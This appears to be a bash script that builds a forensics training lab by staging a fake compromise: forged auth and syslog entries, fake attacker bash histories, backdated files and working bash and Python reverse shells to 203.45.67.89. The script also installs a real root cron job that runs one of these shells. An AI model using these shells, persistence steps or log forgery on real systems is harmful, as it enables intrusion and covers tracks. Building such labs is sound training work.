#!/bin/bash
set -e

# Globomantics Forensics Lab - Simulates a Compromised Server
# This script creates evidence of an attack that happened ~1 hour ago

echo "Initializing compromised server..."

# Update system
apt-get update -qq
apt-get install -y -qq openssh-server openssh-client net-tools curl wget git

# Start SSH
systemctl start ssh
systemctl enable ssh

# Get current time and calculate 1 hour ago
CURRENT_TIME=$(date +%s)
ONE_HOUR_AGO=$((CURRENT_TIME - 3600))
ATTACK_TIME=$(date -d @$ONE_HOUR_AGO '+%Y-%m-%d %H:%M:%S')
ATTACK_HOUR=$(date -d @$ONE_HOUR_AGO '+%H:%M')

# ============================================================================
# CREATE ATTACK EVIDENCE IN LOGS
# ============================================================================

# Create fake auth.log entries showing SSH brute force and successful login
cat > /tmp/fake_auth.log << EOF
$(date -d @$((CURRENT_TIME - 3000)) '+%b %d %H:%M:%S') server sshd[1234]: Invalid user attacker from 203.45.67.89 port 54321
$(date -d @$((CURRENT_TIME - 2995)) '+%b %d %H:%M:%S') server sshd[1235]: Failed password for invalid user attacker from 203.45.67.89 port 54321
$(date -d @$((CURRENT_TIME - 2990)) '+%b %d %H:%M:%S') server sshd[1236]: Invalid user attacker from 203.45.67.89 port 54322
$(date -d @$((CURRENT_TIME - 2985)) '+%b %d %H:%M:%S') server sshd[1237]: Failed password for invalid user attacker from 203.45.67.89 port 54322
$(date -d @$((CURRENT_TIME - 2980)) '+%b %d %H:%M:%S') server sshd[1238]: Failed password for ubuntu from 203.45.67.89 port 54323
$(date -d @$((CURRENT_TIME - 2975)) '+%b %d %H:%M:%S') server sshd[1239]: Failed password for ubuntu from 203.45.67.89 port 54324
$(date -d @$((CURRENT_TIME - 2970)) '+%b %d %H:%M:%S') server sshd[1240]: Failed password for ubuntu from 203.45.67.89 port 54325
$(date -d @$((CURRENT_TIME - 2900)) '+%b %d %H:%M:%S') server sshd[2000]: Accepted password for ubuntu from 203.45.67.89 port 54330 ssh2
$(date -d @$((CURRENT_TIME - 2895)) '+%b %d %H:%M:%S') server sshd[2001]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
EOF

# Append to actual auth.log
sudo bash -c "cat /tmp/fake_auth.log >> /var/log/auth.log"

# Create fake btmp (failed logins)
touch /var/log/btmp
chmod 660 /var/log/btmp

# ============================================================================
# CREATE EVIDENCE OF ATTACKER ACTIONS
# ============================================================================

# Create files that attacker would have created
mkdir -p /tmp/.hidden
mkdir -p /home/ubuntu/.ssh_backup

# Create a backdoor script (fake)
cat > /tmp/.hidden/monitor.sh << 'EOF'
#!/bin/bash
# This would be a backdoor script
while true; do
  /bin/bash -i >& /dev/tcp/203.45.67.89/4444 0>&1
  sleep 3600
done
EOF
chmod 755 /tmp/.hidden/monitor.sh

# Create a reverse shell script
cat > /tmp/.system-check << 'EOF'
#!/bin/bash
# Persistence mechanism
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden/monitor.sh") | crontab -
EOF
chmod 755 /tmp/.system-check

# Create suspicious Python script
cat > /tmp/update.py << 'EOF'
#!/usr/bin/env python3
import socket
import subprocess
import os

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("203.45.67.89", 5555))
    os.dup2(sock.fileno(),0)
    os.dup2(sock.fileno(),1)
    os.dup2(sock.fileno(),2)
    subprocess.call(["/bin/sh","-i"])

if __name__ == "__main__":
    main()
EOF
chmod 755 /tmp/update.py

# Create a suspicious cron job
cat >> /var/spool/cron/crontabs/root << 'EOF'
*/15 * * * * /tmp/.hidden/monitor.sh > /dev/null 2>&1
EOF
chmod 600 /var/spool/cron/crontabs/root

# ============================================================================
# CREATE FAKE BASH HISTORY
# ============================================================================

# Create fake command history showing attacker actions
cat > /home/ubuntu/.bash_history << 'EOF'
ls -la
whoami
sudo su -
cd /tmp
wget https://malicious-domain.com/backdoor.sh
chmod +x backdoor.sh
./backdoor.sh
mkdir .hidden
mv backdoor.sh .hidden/monitor.sh
crontab -l
crontab -e
sudo crontab -l
sudo crontab -e
cat /etc/passwd
cat /etc/shadow
find / -type f -name "*.conf" 2>/dev/null
ls -la /home/
ls -la /root/
cd /var/www
cat config.php
exit
EOF
chown ubuntu:ubuntu /home/ubuntu/.bash_history
chmod 600 /home/ubuntu/.bash_history

# Create fake root history
sudo bash -c 'cat > /root/.bash_history << EOF
ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa
ssh-copy-id -i /root/.ssh/id_rsa.pub ubuntu@localhost
useradd -m -s /bin/bash -d /home/sysmon sysmon
echo "sysmon:P@ssw0rd123" | chpasswd
usermod -aG sudo sysmon
cat /etc/hostname
cat /etc/resolv.conf
ip addr
iptables -L
netstat -tlnp
ps aux
crontab -l
exit
EOF
'

# ============================================================================
# CREATE SUSPICIOUS FILES
# ============================================================================

# Create suspicious file with data exfiltration
cat > /tmp/.dataexport << 'EOF'
database_users.txt
customer_data.csv
financial_records.xlsx
source_code.zip
employee_credentials.txt
EOF

# Create a file showing privilege escalation attempt
echo "attacker ALL=(ALL) NOPASSWD:ALL" > /tmp/sudo_abuse

# Create a data file that looks like it was stolen
mkdir -p /tmp/stolen_data
touch /tmp/stolen_data/users.txt
touch /tmp/stolen_data/passwords.txt
touch /tmp/stolen_data/config.php

# ============================================================================
# MODIFY SYSTEM TIME EVIDENCE
# ============================================================================

# Create wtmp entries (login records) - Fake but show the attack
# This would normally require special tools, but we'll create evidence another way
sudo bash -c 'echo "203.45.67.89 - Suspicious IP that attacked" >> /var/log/syslog'

# ============================================================================
# CREATE NETWORK CONNECTION EVIDENCE
# ============================================================================

# Create a file showing the attacker's actions on network
sudo bash -c 'cat >> /var/log/syslog << EOF
$(date -d @$((CURRENT_TIME - 2900)) '+%b %d %H:%M:%S') server kernel: [12345.678901] TCP connection from 203.45.67.89:54330
$(date -d @$((CURRENT_TIME - 2850)) '+%b %d %H:%M:%S') server sudo: ubuntu : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
$(date -d @$((CURRENT_TIME - 2800)) '+%b %d %H:%M:%S') server kernel: [12346.234567] File modified: /etc/passwd
$(date -d @$((CURRENT_TIME - 2700)) '+%b %d %H:%M:%S') server cron[8901]: (root) CMD (/tmp/.hidden/monitor.sh)
EOF
'

# ============================================================================
# CREATE EVIDENCE OF NEW USER
# ============================================================================

# Add a suspicious new user (attacker backup access)
# Don't actually create it, but leave evidence it was attempted
echo "# User 'sysmon' was attempted to be created on $(date)" >> /tmp/user_creation_log

# ============================================================================
# SET FILE MODIFICATION TIMES
# ============================================================================

# Change file modification times to look like they were created during attack
touch -d "$(date -d @$((CURRENT_TIME - 2850)) '+%Y-%m-%d %H:%M:%S')" /tmp/.hidden/monitor.sh
touch -d "$(date -d @$((CURRENT_TIME - 2800)) '+%Y-%m-%d %H:%M:%S')" /tmp/.system-check
touch -d "$(date -d @$((CURRENT_TIME - 2750)) '+%Y-%m-%d %H:%M:%S')" /tmp/update.py
touch -d "$(date -d @$((CURRENT_TIME - 2700)) '+%Y-%m-%d %H:%M:%S')" /tmp/.dataexport
touch -d "$(date -d @$((CURRENT_TIME - 2600)) '+%Y-%m-%d %H:%M:%S')" /tmp/sudo_abuse

# ============================================================================
# SETUP COMPLETE
# ============================================================================

echo "✓ Forensics lab ready!"
echo "✓ Attack happened approximately 1 hour ago"
echo "✓ Evidence files created:"
echo "  - /var/log/auth.log (attack logs)"
echo "  - /home/ubuntu/.bash_history (attacker commands)"
echo "  - /tmp/.hidden/ (backdoor scripts)"
echo "  - /tmp/*.py (malicious scripts)"
echo "  - /var/spool/cron/crontabs/root (persistence)"

# Cleanup temp files
rm -f /tmp/fake_auth.log
